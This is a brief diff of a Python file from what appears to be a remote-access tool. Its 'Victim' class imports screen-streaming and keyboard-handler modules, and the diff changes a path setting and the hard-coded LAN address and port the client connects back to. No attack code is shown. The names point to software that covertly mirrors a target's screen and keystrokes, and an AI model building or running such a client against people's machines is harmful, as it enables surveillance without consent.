@@ -4,7 +4,7 @@ import threading
 
 from screen_mirroring.screen_stream import ScreenStream
 
-sys.path.append('..')
+sys.path.append('')
 
 from handelrs.keyboard_handelr import HandelKeyboard
 from protocol.protocol import HandelPacket, PacketType
@@ -52,4 +52,4 @@ class Victim:
 
 
 if __name__ == '__main__':
-    Victim('192.168.1.129', 1245).main()
+    Victim('192.168.1.108', 3333).main()
